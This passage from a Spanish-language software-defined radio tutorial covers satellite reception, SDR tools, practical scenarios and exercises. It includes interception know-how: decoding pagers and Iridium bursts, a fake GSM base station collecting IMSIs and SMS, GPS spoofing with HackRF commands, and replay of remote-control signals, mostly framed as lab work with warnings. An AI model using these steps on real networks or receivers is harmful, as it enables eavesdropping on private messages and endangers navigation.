**Diferencias con NOAA APT**:

```
NOAA APT:
- Analógico (FM/AM)
- Resolución: 4 km/pixel
- 3 canales (vis, IR)
- Fácil de recibir

Meteor LRPT:
- Digital (QPSK)
- Resolución: 1 km/pixel
- 6 canales (RGB, NIR)
- Más datos pero requiere mejor recepción
```

**Frecuencias Meteor**:

```
Meteor-M2: 137.900 MHz (LRPT)
Meteor-M2-2: 137.900 MHz (LRPT)
Meteor-M2-3: 137.900 MHz (LRPT)
Meteor-M2-4: 137.900 MHz (LRPT)

Modulación: QPSK, símbolos 72k, ancho ~100 kHz
```

**Captura y decodificación**:

```bash
# Capturar IQ
rtl_sdr -f 137.900M -s 1200000 -g 45 -n 36000000 meteor.iq

# Decodificar con meteor_demod (de SatDump)
# O con MeteorGIS
meteor_demod -m qpsk -s 1200000 -d 72000 -o meteor.bin meteor.iq

# Decodificar imagen
meteor_decode -b meteor.bin -o image.png

# O mejor: SatDump
satdump live meteor_m2_lrpt 137.900M 1200000 ./output -source rtlsdr
```

**Comparación NOAA vs Meteor**:

```
NOAA: más fácil, antena menos crítica, resolución baja
Meteor: mejor resolución, requiere mejor recepción, QPSK más complejo
```

### 8.3 GOES Reception

GOES (Geostationary Operational Environmental Satellite) son satélites geoestacionarios de NOAA.

**GOES activos**:

```
GOES-16 (GOES East): 75.2°W (América del Sur/África)
GOES-17 (GOES West): 137.2°W (Pacífico)
GOES-18 (GOES West): 137.2°W (reemplazó a 17)

Frecuencias:
GOES-16 HRIT: 1694.1 MHz
GOES-17/18 HRIT: 1694.5 MHz

Ancho de banda: ~2.5 MHz
Modulación: BPSK
```

**Requisitos para GOES**:

```
Antena: parabólica de 60cm+ (o parche helicoidal)
SDR: RTL-SDR (BW 2.4 MHz, suficiente)
LNA: recomendado (1694 MHz es alta frecuencia)
Software: goestools (goesproc, goesrecv)
Filtro: SAW filter 1694 MHz (opcional pero recomendado)
```

**GOES con goestools**:

```bash
# Instalar goestools
git clone https://github.com/pietern/goestools.git
cd goestools
mkdir build && cd build
cmake ..
make -j4
sudo make install

# Configurar
# /etc/goestools/goesrecv.conf
[demodulator]
mode = "hrit"

[decoder]
source = "rtlsdr"
# source = "file" (para archivos IQ)

[sdr]
type = "rtlsdr"
frequency = 1694100000
sample_rate = 2400000
gain = "auto"

[output]
type = "file"
directory = "/data/goes"
```

```bash
# Recibir GOES
goesrecv -v -c /etc/goestools/goesrecv.conf

# Procesar imágenes
goesproc -c /etc/goestools/goesproc.conf -m packet --dir /data/goes

# Las imágenes se guardan en /data/goes
# Formatos: GOES-16 Channels (C01-C16), true color composites
```

**Análisis de imágenes GOES**:

```python
# Python para procesar imágenes GOES
import numpy as np
import matplotlib.pyplot as plt
from PIL import Image

# Cargar banda específica
ch2 = np.fromfile('goes_16_c02.dat', dtype=np.uint16).reshape(5424, 5424)

# Normalizar
ch2 = (ch2 - np.min(ch2)) / (np.max(ch2) - np.min(ch2)) * 255

# Guardar
Image.fromarray(ch2.astype(np.uint8)).save('goes_c02.png')
```

### 8.4 Satellite Phone Interception

Los teléfonos satelitales (Iridium, Inmarsat, Thuraya) se pueden interceptar con [sdr](../raw/sdr-t3l3c0ms.md).

**Iridium**:

```
Frecuencias:
  Uplink (MS → sat): 1621.35 - 1626.5 MHz
  Downlink (sat → MS): 1616 - 1626.5 MHz

Modulación: QPSK / BPSK (depende del canal)
Ancho de canal: 31.5 kHz
TDMA: 4 timeslots por canal
```

**Inmarsat**:

```
Banda L:
  Downlink: 1525 - 1559 MHz
  Uplink: 1626.5 - 1660.5 MHz

Banda C (terminales marítimas):
  Downlink: 3600 - 4200 MHz

Modulación: QPSK, OQPSK
Ancho de canal: 5-200 kHz
```

**Captura de Iridium**:

```bash
# Iridium downlink ~1616-1626.5 MHz
# Sample rate: 2.5 MHz (cubre toda la banda)

rtl_sdr -f 1621000000 -s 2500000 -g 40 -n 50e6 iridium.iq

# Analizar con Inspectrum o URH
# Iridium bursts son cortos (~8 ms)

# Decodificar con gr-iridium
git clone https://github.com/muccc/gr-iridium.git
cd gr-iridium
mkdir build && cd build
cmake ..
make -j4
sudo make install

# Capturar y decodificar
iridium-extractor -i 1621000000 -s 2500000 -o decoded.txt
```

**Limitaciones de intercepción satelital**:

```
- Muchos sistemas tienen encriptación
- Iridium: L-band data puede estar encriptado
- Inmarsat: voz y datos encriptados (a menos que sea antiguo)
- Thuraya: GSM-based, pero satelital
- El tráfico de voz generalmente no es descifrable
```

### 8.5 Inmarsat / Iridium

**Inmarsat STD-C (telex)**:

```
Inmarsat C:
  - Transmisiones de texto (telex/data)
  - Frecuencia: 1530-1545 MHz (downlink)
  - Se puede interceptar con antena direccional y LNA
  - Mensajes NCS (Network Coordination Station)
```

**Iridium SBD (Short Burst Data)**:

```bash
# Iridium SBD: mensajes cortos de datos
# Usado por: assets tracking, IoT, mensajería satelital

# Capturar con gr-iridium
iridium-extractor -i 1621000000 -s 2500000

# Decodificar SBD
iridium-toolkit decode-sbd extracted.bits

# Analizar contenido (texto plano posible)
strings extracted.bits
```

**Satellite AIS (Automatic Identification System)**:

```
AIS satélital: monitoreo de barcos desde el espacio
Frecuencia: 161.975 MHz (AIS1), 162.025 MHz (AIS2)
Modulación: GMSK, 9600 bps
Se puede recibir con RTL-SDR y antena VHF
```

```bash
# Capturar AIS satélital
rtl_fm -f 161.975M -s 9600 -g 40 - | multimon-ng -t raw -A AIS /dev/stdin
```

### 8.6 CubeSat y Amateur Satellites

Miles de satélites amateur y CubeSats transmiten en UHF/VHF.

**Banda de radioaficionados satelital**:

```
Uplink: 435-438 MHz (modo U/V)
Downlink: 145-146 MHz (modo U/V)
Alta velocidad (AX.25, GMSK): 9600 bps, 19200 bps

Banda S (algunos):
Downlink: 2.4-2.45 GHz
```

**Satélites amateur populares**:

```
ISS (International Space Station):
  - APRS digipeater: 145.825 MHz (AX.25 1200 bps)
  - SSTV: 145.800 MHz (en eventos especiales)
  - Voice repeater: 145.800 MHz (descenso)

AO-91 (AMSAT):
  - FM repeater: 145.960 MHz (downlink)
  - Uplink: 435.250 MHz (67.0 Hz CTCSS)

SO-50 (FalconSAT):
  - FM repeater: 436.795 MHz
  - Uplink: 145.850 MHz (67.0 Hz CTCSS)

APRS satélite:
  - ISS digipeater: 145.825 MHz
  - LAPAN-A2: 145.825 MHz
```

**Capturar ISS APRS**:

```bash
# Recibir APRS de la ISS
# Frecuencia: 145.825 MHz
# Modulación: AFSK 1200 bps (Audio Frequency Shift Keying)

rtl_fm -f 145.825M -s 22050 -g 40 - | multimon-ng -t raw -A AFSK1200 /dev/stdin

# Output:
# 2024-01-15 14:32:00  RS0ISS-3>APRS: >Hello from ISS!
# 2024-01-15 14:32:05  LU1AAA-5>BEACON: 73 de LU1AAA, Buenos Aires
```

**FUNcube (AMSAT-UK)**:

```bash
# FUNcube-1 (AO-73): satélite educativo
# Downlink: 145.935 MHz (BPSK telemetry)
# Ancho de banda: ~20 kHz

rtl_fm -f 145.935M -M fm -s 48000 -g 40 - | telem_decode
```

---

## 9. Herramientas

### 9.1 GNU Radio

GNU Radio es el framework más importante para [sdr](../raw/sdr-t3l3c0ms.md). Permite construir sistemas de procesamiento de señal mediante bloques conectados en grafos.

```bash
# Instalación
sudo apt install gnuradio gr-osmosdr

# O desde fuente (última versión)
git clone https://github.com/gnuradio/gnuradio.git
cd gnuradio
mkdir build && cd build
cmake ..
make -j4
sudo make install
```

**Componentes básicos**:

```
Sources:
- RTL-SDR Source (rtl=0)
- HackRF Source
- USRP Source
- File Source (leer IQ de archivo)
- Signal Generator (señales de prueba)

Sinks:
- Osmocom Sink (transmitir)
- HackRF Sink
- USRP Sink
- File Sink (guardar IQ)
- Audio Sink
- WX GUI Waterfall Sink

Operaciones:
- Low Pass Filter
- Rational Resampler
- Multiply/Add
- FFT
- Constellation Sink
- QT GUI Range, Entry
```

**Ejemplo: FM Receiver en GNU Radio**:

```python
#!/usr/bin/env python3
from gnuradio import gr, blocks, analog, audio, filter, eng, fft
from gnuradio import qtgui
import sys, sip

class fm_receiver(gr.top_block):
    def __init__(self):
        gr.top_block.__init__(self, "FM Receiver")
        
        # Parámetros
        samp_rate = 2e6
        center_freq = 100.5e6
        decimation = 200
        
        # RTL-SDR Source
        self.rtl = osmosdr.source(args="rtl=0")
        self.rtl.set_center_freq(center_freq, 0)
        self.rtl.set_sample_rate(samp_rate)
        self.rtl.set_gain(40)
        
        # Low Pass Filter (extraer FM channel)
        self.lpf = filter.fir_filter_ccf(
            decimation,
            filter.firdes.low_pass(1.0, samp_rate, 100e3, 10e3)
        )
        
        # Demodulador FM
        self.fm_demod = analog.quadrature_demod_cf(1.0)
        
        # Audio filter
        self.audio_lpf = filter.fir_filter_fff(
            1,
            filter.firdes.low_pass(1.0, samp_rate/decimation, 15e3, 1e3)
        )
        
        # Audio sink
        self.audio = audio.sink(48000)
        
        # Conectar
        self.connect(self.rtl, self.lpf, self.fm_demod)
        self.connect(self.fm_demod, self.audio_lpf, self.audio)

def main():
    tb = fm_receiver()
    tb.start()
    input("Presioná Enter para salir\n")
    tb.stop()
    tb.wait()

if __name__ == "__main__":
    main()
```

**Bloques importantes para seguridad**:

```python
# Análisis espectral
self.fft_sink = qtgui.freq_sink_c(
    1024,              # FFT size
    filterwin=filter.firdes.WIN_BLACKMAN_HARRIS,
    fc=0,              # Center frequency
    bw=samp_rate,      # Bandwidth
    name="Spectrum"
)

# Constellation plot
self.const = qtgui.const_sink_c(
    1024,
    samp_rate,
    "Constellation"
)

# Waterfall plot
self.waterfall = qtgui.waterfall_sink_c(
    1024,
    filterwin=filter.firdes.WIN_BLACKMAN_HARRIS,
    fc=0,
    bw=samp_rate,
    name="Waterfall"
)
```

### 9.2 GQRX

GQRX es el receptor SDR gráfico más popular.

```bash
# Instalación
sudo apt install gqrx-sdr

# Ejecutar
gqrx
```

**Características principales**:

```
- Espectro + waterfall en tiempo real
- Soporte para RTL-SDR, HackRF, AirSpy, USRP, etc.
- Múltiples modos: AM, FM (Narrow/Wide), SSB, CW
- Grabación IQ (raw) o audio (demodulado)
- Bookmark de frecuencias
- Filtro ajustable
- AGC (Automático/Manual)
- FFT Plot
- Demodulación en tiempo real
```

**Atajos de teclado**:

```
Space: Play/Pause
F: Cambiar modo (FM/AM/SSB/etc.)
M: Silenciar
R: Empezar/parar grabación
+/-: Zoom en waterfall
←/→: Sintonizar frecuencia
↑/↓: Cambiar zoom de frecuencia
```

**Flujo típico de trabajo**:

```
1. Conectar antena
2. Abrir GQRX
3. Seleccionar dispositivo (RTL-SDR)
4. Ajustar frecuencia
5. Seleccionar modo (WFM para broadcast, NFM para PMR, AM para aviación)
6. Ajustar ganancia
7. Escuchar / grabar
```

### 9.3 Inspectrum

Inspectrum es un analizador de señales offline (capturar y analizar después).

```bash
# Instalación
sudo apt install inspectrum

# O desde fuente
git clone https://github.com/miek/inspectrum.git
cd inspectrum
mkdir build && cd build
cmake ..
make -j4
sudo make install
```

**Uso**:

```bash
# Abrir archivo IQ
inspectrum capture.iq -s 2000000

# Atajos:
# Click derecho: zoom out
# Rueda: zoom
# Drag: seleccionar región
# Ctrl+C: colapsar espectro
# T: toggle time domain

# Exportar:
# Seleccionar región → right click → "Extract symbols"
```

**Análisis típico**:

```
1. Capturar señal desconocida
2. Abrir en Inspectrum
3. Identificar modulación (forma de los bursts)
4. Medir ancho de banda, duración, spacing
5. Exportar símbolos para decodificación
```

### 9.4 Universal Radio Hacker (URH)

URH es la herramienta más poderosa para reverse engineering de señales.

```bash
# Instalación
pip install urh

# Ejecutar
urh
```

**Capacidades**:

```
- Captura en vivo (RTL-SDR, HackRF, USRP, etc.)
- Decodificación automática (detecta modulación)
- Protocolos: RS232, DMX, POCSAG, etc.
- Generación de señales (para transmitir)
- Análisis de constelación
- Interpretación de bits/símbolos
- Participant generation
- Checksum cracking (busca CRC automáticamente)
- Fuzzing (RfCat, HackRF)

Flujo de trabajo:
1. Record/Capture
2. View → demodular
3. Interpret (convertir señal a bits)
4. Analysis (buscar patrones, checksums)
5. Generate (crear señal falsa)
6. Simulate/Action (transmitir)
```

**Ejemplo: Reverse engineer de señal RF**:

```bash
# 1. Capturar señal con URH
# File → Record Signal
# Seleccionar dispositivo, frecuencia, sample rate
# Apuntar y grabar

# 2. Demodular automáticamente
# View → Demodulate
# URH detecta modulación (ASK, FSK, PSK, QAM)

# 3. Interpretar
# Seleccionar región → Interpret → Convert to bits
# Probar diferentes longitudes de símbolo

# 4. Analizar
# Analysis → Show Protocol → ver si hay estructura
# Analysis → Checksum Cracking

# 5. Reproducir
# Generate → Generate Signal
# HackRF → Send
```

**URH en línea de comandos**:

```bash
# Análisis offline
urh_cli -p capture.urh -e protocol.bit

# Generar señal
urh_cli -p capture.urh -g signal.iq

# Transmitir
urh_cli -p capture.urh -t -d hackrf
```

### 9.5 rtl_433

rtl_433 decodifica señales de sensores de 433 MHz (IoT, meteorología, sensores).

```bash
# Instalación
git clone https://github.com/merbanan/rtl_433.git
cd rtl_433
mkdir build && cd build
cmake ..
make -j4
sudo make install

# Uso básico
rtl_433

# Output:
# 2024-01-15 14:32:00  :  :  : AcuRite 00612TX Sensor
#   Temperature: 22.5°C
#   Humidity: 65%
# 2024-01-15 14:32:05  :  :  : Fine Offset Electronics WH0280/WH0281
#   Wind Speed: 12.3 km/h
```

**Sensores soportados** (cientos):

```
- Acurite
- Fine Offset
- LaCrosse
- Oregon Scientific
- Ambient Weather
- Honeywell
- Nexus
- Prologue
- ...

Frecuencia: 433.92 MHz (ISM band)
```

**Flags útiles**:

```bash
# Guardar a archivo CSV
rtl_433 -F csv:data.csv

# Guardar a MQTT
rtl_433 -F mqtt://localhost:1883

# Frecuencia específica
rtl_433 -f 868M

# Salida JSON
rtl_433 -F json:data.json

# Analizar archivo IQ
rtl_433 -r capture.iq -s 250k
```

### 9.6 dump1090

dump1090 decodifica señales ADS-B de aviones (1090 MHz).

```bash
# Instalación
git clone https://github.com/antirez/dump1090.git
cd dump1090
make

# Uso básico
./dump1090

# Con salida de mapa
./dump1090 --interactive --net

# Output:
# 2024-01-15 14:32:00  ICAO: E48D4B  Flight: ARG1234  Alt: 35000 ft  Speed: 480 kt  Squawk: 1000
# 2024-01-15 14:32:05  ICAO: A8C123  Flight: UAL567  Alt: 37000 ft  Speed: 520 kt  Heading: 270°

# Modo web (mapa en http://localhost:8080)
./dump1090 --interactive --net --aggressive

# Con RTL-SDR específico
./dump1090 --devidx 0
```

**Qué muestra ADS-B**:

```
ICAO: Identificador único de 24 bits (hex)
Flight: Número de vuelo
Altitude: Altitud barométrica
Speed: Velocidad
Heading: Rumbo
Lat/Lon: Posición (cuando está disponible)
Vertical Rate: Velocidad vertical
Squawk: Código transpondedor
Squawk: Identificación de emergencia (7500=hijack, 7600=comms loss, 7700=emergency)
```

**Broadcast ADS-B**:

```
Frecuencia: 1090 MHz (Mode S Extended Squitter)
Modulación: Pulse Position Modulation (PPM)
Tasa: 1 Mbps
Cada avión transmite ~6 mensajes/segundo
Posición: cada ~0.5 segundos
```

### 9.7 Multimon-NG

Multimon-NG decodifica múltiples protocolos de radio digital.

```bash
# Instalación
sudo apt install multimon-ng

# Uso básico
rtl_fm -f 145.825M -s 22050 -g 40 - | multimon-ng -t raw -a AFSK1200 /dev/stdin

# Protocolos soportados:
# AFSK1200, AFSK2400, AFSK2400_7E
# HAPN4800
# FSK9600
# ZVEI1, ZVEI2, ZVEI3
# POCSAG512, POCSAG1200, POCSAG2400
# MORSE_CW
# DTMF
# X10
# SCOPE
```

**Decodificar POCSAG (pager)**:

```bash
# Pagers (buscapersonas) en 400-470 MHz
# POCSAG: 512, 1200, 2400 bps

# Encontrar frecuencia de pager (escaneo)
rtl_power -f 400M:470M:12.5k -i 10

# Capturar y decodificar
rtl_fm -f 466.175M -s 22050 -g 40 - | multimon-ng -t raw -a POCSAG1200 /dev/stdin

# Output:
# 2024-01-15 14:32:00  POCSAG512: Address: 123456  Function: 0  Alpha:  Mensaje importante del hospital
# 2024-01-15 14:32:05  POCSAG1200: Address: 789012  Function: 3  Numeric: 5551234
```

### 9.8 WSJT-X / FT8

WSJT-X es software para modos digitales de radioaficionados (FT8, JT65, JT9, WSPR).

```bash
# Instalación
sudo apt install wsjt-x

# O descargar de https://physics.princeton.edu/pulsar/K1JT/wsjtx.html
```

**FT8**:

```
Frecuencia: 14.074 MHz (20m band, la más activa)
Modulación: 8-FSK (Frequency Shift Keying, 8-tonos)
Ancho de banda: 50 Hz (!)
Duración: 15 segundos por transmisión
Mensajes: cortos (73, grid locator, signal report)
Sincronización: por hora UTC (tx en :00/:15/:30/:45)
```

**WSPR (Weak Signal Propagation Reporter)**:

```
Frecuencia: varias bandas (14.0956 MHz WSPR)
Modulación: 4-FSK
Ancho de banda: ~6 Hz
Potencia típica: 1-100 mW (!)
Alcance: global (con antena decente)
Propósito: estudiar propagación
```

**Ejemplo de uso FT8**:

```bash
# 1. Conectar SDR a WSJT-X
# Para RTL-SDR, usar rtl_fm o HDSDR como entrada

# 2. Sintonizar 14.074 MHz (20m FT8)
# Modo USB

# 3. WSJT-X decodifica automáticamente
# Cada 15 segundos aparecen estaciones

# 4. Hacer QSO (contacto)
# Doble click en estación → WSJT-X prepara respuesta
# Esperar turno de transmisión
# Intercambiar reportes y grid locator
```

---

## 10. Escenarios Prácticos

### 10.1 Escenario 1: Captura y Decodificación de Pager (POCSAG)

**Setup**: Pagers (buscapersonas) todavía se usan en hospitales, bomberos, servicios de emergencia. Generalmente transmiten en claro.

**Paso 1: Encontrar la frecuencia**:

```bash
# Escanear banda de pager (400-470 MHz)
rtl_power -f 400M:470M:12.5k -i 10 -e 300 pager_scan.csv

# Buscar picos de señal (señales POCSAG son bursts con subida rápida)
# O buscar en el rango 929-932 MHz (pager US POCSAG)
# En Europa: 450-470 MHz
```

**Paso 2: Capturar y decodificar**:

```bash
# Sintonizar frecuencia sospechosa
rtl_fm -f 466.175M -s 22050 -g 40 - | multimon-ng -t raw -a POCSAG1200 /dev/stdin

# O capturar IQ para análisis offline
rtl_sdr -f 466175000 -s 2048000 -g 40 -n 100e6 pager_capture.iq

# Analizar con URH
urh pager_capture.iq
```

**Paso 3: Analizar contenido**:

```bash
# Si el pager usa alpha-numeric text, verás:
# POCSAG1200: Address: 123456  Function: 0  Alpha:  URGENTE - Dr. Garcia al quirófano 3

# Direcciones de pager (addresses):
# - Cada pager tiene una dirección única (21 bits)
# - Se pueden filtrar para monitorear pagers específicos
```

### 10.2 Escenario 2: ADS-B Aircraft Tracking

**Setup**: Monitorear tráfico aéreo en tiempo real.

**Paso 1: Hardware**:

```
RTL-SDR (suficiente, ADS-B necesita solo 2 MHz BW)
Antena: 1090 MHz (monopolo de λ/4 ≈ 6.8 cm)
O antena de 1090 MHz dedicada (mejor recepción)
```

**Paso 2: Capturar**:

```bash
# dump1090 con mapa web
dump1090 --interactive --net --aggressive

# Abrir navegador: http://localhost:8080
# Verás un mapa con todos los aviones
```

**Paso 3: Analizar datos**:

```bash
# Salida JSON
# dump1090 expone API en http://localhost:8080/data.json

curl -s http://localhost:8080/data.json | jq '.[] | {flight, alt_baro, speed, lat, lon}'

# Enviar a servicios como FlightAware (PiAware)
# o ADS-B Exchange
```

### 10.3 Escenario 3: NOAA Weather Satellite

**Setup**: Recibir imágenes de satélites meteorológicos.

**Paso 1: Predecir pasada**:

```bash
# Obtener TLE
wget -q -O weather.txt https://www.celestrak.com/NORAD/elements/weather.txt

# Predecir pasadas
predict -t weather.txt -p "NOAA 19"

# Elegir pasada con máxima elevación > 30°
```

**Paso 2: Antena**:

```bash
# V-dipolo para 137 MHz
# Dos varillas de 53 cm, 120° entre sí
# Orientado N-S, mirando hacia el satélite
# O QFH (Quadrifilar Helical) si querés mejor recepción
```

**Paso 3: Capturar**:

```bash
# Durante la pasada (~15 minutos)
rtl_fm -f 137.100M -M fm -s 44100 -g 49.6 2>/dev/null | sox -t raw -r 44100 -e signed -b 16 -c 1 -V1 - noaa.wav

# O con GQRX (mejor para ver señal en tiempo real)
# Grabar audio demodulado (WAV)
```

**Paso 4: Decodificar**:

```bash
wxtoimg -m -A -e HVC noaa.wav image.png

# O SatDump
satdump noaa_apt noaa.wav output_directory
```

### 10.4 Escenario 4: GSM Capture en Lab

**Setup**: Capturar señales GSM en un laboratorio controlado.

**Requisitos**:

```
Dos SDR: uno para BTS falsa (HackRF o LimeSDR)
          otro para sniffing (RTL-SDR o AirSpy)
Teléfono GSM (sin SIM o con SIM de test)
Atenuadores RF (para no interferir redes reales)
```

**Paso 1: Configurar BTS falsa**:

```bash
# Configurar YateBTS u OpenBTS
# Usar banda GSM-900, ARFCN 50 (downlink: 945.0 MHz)
# Potencia muy baja (solo para el lab)

# ybts.conf:
Radio.Band=900
Radio.C0=50
Radio.PowerLevel=1  # Mínima potencia
Control.Access=open
```

**Paso 2: Configurar sniffer**:

```bash
# Con RTL-SDR, capturar downlink GSM
grgsm_livemon -f 945M

# O capturar en archivo
grgsm_capture -f 945M -s 1e6 -c 10000000 -o gsm_capture.cfile
```

**Paso 3: Registrar teléfono**:

```bash
# Encender teléfono (sin SIM o SIM test)
# Buscará redes y encontrará la BTS falsa
# Se registrará automáticamente

# Ver en logs de YateBTS:
tail -f /var/log/yate.log | grep IMSI

# El IMSI del teléfono aparecerá
```

**Paso 4: Capturar tráfico**:

```bash
# Hacer llamada o enviar SMS entre teléfonos
# Analizar captura GSM

grgsm_decode -c gsm_capture.cfile -s 1e6 -m SDCCH -t 0 -o decoded.txt
cat decoded.txt | grep -A5 "RP-DATA\|CP-DATA"
```

### 10.5 Escenario 5: [gps spoofing](../raw/sp4c3-s3c.md#gps-spoofing) Simulator

**Setup**: Simular señales GPS falsas con [hackrf](../raw/sdr-t3l3c0ms.md#hackrf)-t3l3c0ms.md#[hackrf](../raw/sdr-t3l3c0ms.md#hackrf)).

**Paso 1: Generar señal**:

```bash
# Posición falsa: Plaza de Mayo, Buenos Aires
gps-sdr-sim -l -34.6083,-58.3717,25 -b 8 -d 300

# Output: gpssim.bin (5 minutos de señal GPS falsa)
```

**Paso 2: Configurar ambiente de prueba**:

```bash
# En laboratorio blindado (o en campo abierto alejado)
# HackRF conectado a atenuador (20-30 dB)
# Antena GPS conectada al atenuador
# Receptor GPS (teléfono, módulo GPS) cerca

# O: sin antena, con conexión directa a receptor GPS
# HackRF → Cable SMA → Receptor GPS
```

**Paso 3: Transmitir**:

```bash
hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 0 -x 0 -R
```

**Paso 4: Verificar**:

```bash
# Monitorear salida NMEA del receptor GPS
# Si el receptor acepta la señal falsa:
# $GPGGA,123519,3408.3333,S,05822.2333,W,1,08,0.9,25.0,M,0.0,M,,*59

# La posición debe coincidir con -34.6083,-58.3717
```

---

## 11. Ejercicios Prácticos

### Ejercicio 1: Configurar RTL-[sdr](../raw/sdr-t3l3c0ms.md) y GQRX

```bash
# 1. Conectá tu RTL-SDR
# 2. Verificá que el sistema lo detecta
rtl_test -t

# 3. Abrí GQRX
gqrx

# 4. Sintonizá una estación FM local (88-108 MHz)
# 5. Escuchá la radio
# 6. Ahora sintonizá 433.92 MHz (sensores IoT)
# ¿Qué ves en el waterfall?

# Preguntas:
# - ¿Cuál es el SNR de la estación FM?
# - ¿Hay señales en 433 MHz?
# - ¿Podés identificar el modo de transmisión?
```

### Ejercicio 2: Capturar y Analizar una Señal Desconocida

```bash
# 1. Capturá 10 segundos de 433.92 MHz
rtl_sdr -f 433920000 -s 2048000 -n 20480000 unknown.iq

# 2. Abrí con Inspectrum
inspectrum unknown.iq -s 2048000

# 3. Identificá:
# - ¿Hay bursts de señal?
# - ¿Cuánto dura cada burst?
# - ¿Qué modulación parece?
# - ¿Hay periodicidad?

# 4. Abrí con URH
urh

# 5. Intentá demodular y decodificar
# ¿Podés identificar el protocolo?
```

### Ejercicio 3: Decodificar POCSAG

```bash
# 1. Escaneá entre 400-470 MHz para encontrar señales de pager
# (si estás cerca de un hospital, hay alta probabilidad)
rtl_power -f 400M:470M:125k -i 10

# 2. Sintonizá la frecuencia más prometedora
rtl_fm -f <frecuencia> -s 22050 -g 40 - | multimon-ng -t raw -a POCSAG1200 /dev/stdin

# 3. Dejá correr 30 minutos
# ¿Cuántos mensajes capturaste?
# ¿Podés identificar direcciones de pager?
# ¿Los mensajes están en claro?
```

### Ejercicio 4: Rastrear Aviones con ADS-B

```bash
# 1. Conectá antena para 1090 MHz
# 2. Ejecutá dump1090
dump1090 --interactive --net

# 3. Abrí http://localhost:8080 en el navegador
# 4. Contestá:
# - ¿Cuántos aviones ves?
# - ¿Cuál es el más alto?
# - ¿Cuál es el más rápido?
# - ¿Hay algún avión con Squawk 7700?

# 5. Capturá datos por 1 hora y guardálos:
dump1090 --interactive --net --write-json /tmp/adsb_data/
```

### Ejercicio 5: Recibir Satélite NOAA

```bash
# 1. Obtener TLE
wget -q -O weather.txt https://www.celestrak.com/NORAD/elements/weather.txt

# 2. Predecir próxima pasada de NOAA 15, 18 o 19
predict -t weather.txt -p "NOAA 19" | head -5

# 3. Armar antena V-dipolo para 137 MHz
# 4. Cuando pase, grabar
rtl_fm -f 137.100M -M fm -s 44100 -g 49.6 2>/dev/null | \
  sox -t raw -r 44100 -e signed -b 16 -c 1 -V1 - noaa.wav

# 5. Decodificar
wxtoimg -m -A -e HVC noaa.wav noaa_image.png

# 6. ¿Lograste recibir imagen?
# ¿Se ve Argentina?
# ¿Qué canales recibiste?
```

### Ejercicio 6: Analizar Señal de Control Remoto

```bash
# 1. Buscá un control remoto (garage, auto, TV)
# 2. Capturá la señal cuando apretás un botón
rtl_sdr -f 433920000 -s 2048000 -n 10000000 remote.iq

# 3. Abrí en URH
urh remote.iq

# 4. Identificá:
# - ¿Es OOK (ASK) o FSK?
# - ¿Cuánto dura el paquete?
# - ¿Cuántos bits tiene?
# - ¿Hay parte fija y parte variable?

# 5. Intentá decodificar el mensaje
# ¿Qué bits cambian cuando apretás otro botón?

# 6. (Opcional) Re-transmití la señal con HackRF
# ¿El dispositivo receptor acepta la señal?
```

### Ejercicio 7: Configurar GNU Radio Flowgraph

```python
# Creá este flowgraph en GNU Radio Companion:

# 1. RTL-SDR Source (frecuencia de FM local, 2 Msps)
# 2. Low Pass Filter (cutoff 100 kHz)
# 3. Rational Resampler (de 2Msps a 48k)
# 4. WBFM Receive (Quadrature Demod)
# 5. Audio Sink

# Preguntas:
# - ¿Por qué el LPF tiene cutoff 100 kHz?
# - ¿Qué pasa si no ponés el resampler?
# - ¿Se escucha bien?
```

### Ejercicio 8: [gps spoofing](../raw/sp4c3-s3c.md#gps-spoofing) (Lab Controlado)

```bash
# SOLO EN LABORATORIO O CAMPO ABIERTO SIN RECEPTORES REALES

# 1. Generar señal GPS falsa
gps-sdr-sim -l -34.6037,-58.3816,25 -b 8 -d 60

# 2. Conectar HackRF a través de atenuador de 30dB
# 3. Conectar atenuador a receptor GPS (u-blox, teléfono en modo avión)
# 4. Transmitir
hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 0 -x 0 -R

# 5. Monitorear NMEA output del receptor
# ¿El receptor se fijó en la posición falsa?

# PRECAUCIÓN: NO transmitir GPS al aire
# Es ilegal y peligroso (puede afectar aviones/drones)
```

---

## 12. Referencias y Recursos

### Libros
- *The Hobbyist's Guide to the RTL-[sdr](../raw/sdr-t3l3c0ms.md)* - Carl Laufer
- *[software defined radio](../raw/sdr-t3l3c0ms.md) using MATLAB & Simulink* - Stewart et al.
- *Digital Signal Processing in Radio Communications* - Hound
- *Hacking RF: A Guide to Software Defined Radio* - Various
- *The ARRL Handbook for Radio Communications*

### Documentación técnica
- [GNU Radio Wiki](https://wiki.gnuradio.org/)
- [Osmocom](https://osmocom.org/)
- [srsRAN Documentation](https://docs.srsran.com/)
- [3GPP Specifications](https://www.3gpp.org/specifications)
- [GPS ICD (IS-GPS-200)](https://www.gps.gov/technical/icwg/)

### Software
- [GNU Radio](https://www.gnuradio.org/)
- [GQRX](https://gqrx.dk/)
- [Inspectrum](https://github.com/miek/inspectrum)
- [Universal Radio Hacker](https://github.com/jopohl/urh)
- [rtl_433](https://github.com/merbanan/rtl_433)
- [dump1090](https://github.com/antirez/dump1090)
- [Multimon-NG](https://github.com/EliasOenal/multimon-ng)
- [SatDump](https://github.com/SatDump/SatDump)
- [WSJT-X](https://physics.princeton.edu/pulsar/K1JT/wsjtx.html)

### Hardware
- [RTL-SDR Blog](https://www.rtl-sdr.com/)
- [Great Scott Gadgets (HackRF)](https://greatscottgadgets.com/hackrf/)
- [Lime Microsystems](https://limemicro.com/)
- [Nuand (BladeRF)](https://www.nuand.com/)
- [Ettus Research (USRP)](https://www.ettus.com/)
- [Analog Devices (PlutoSDR)](https://www.analog.com/en/design-center/evaluation-hardware-and-software/evaluation-boards-kits/adalm-pluto.html)

### Comunidad
- [r/rtlsdr](https://reddit.com/r/rtlsdr)
- [r/amateurradio](https://reddit.com/r/amateurradio)
- [r/GNURadio](https://reddit.com/r/GNURadio)
- [HackRF Users Group](https://groups.google.com/g/hackrf-users)
- [GNU Radio Discuss](https://lists.gnu.org/mailman/listinfo/discuss-gnuradio)

### Canales de YouTube
- Michael Ossmann ([hackrf](../raw/sdr-t3l3c0ms.md#hackrf) tutorials)
- The Thought Emporium (SDR projects)
- Tech Minds (SDR reviews)
- GreatScott! (RF projects)
- Andreas Spiess (RTL-SDR, LoRa)

### Seguridad
- [GSM Security Research](https://gsmsecurityresearch.blogspot.com/)
- [Kraken A5/1 Cracker](https://github.com/Oros42/KRAKEN)
- [IMSI Catcher Detector](https://cellularprivacy.github.io/Android-IMSI-Catcher-Detector/)
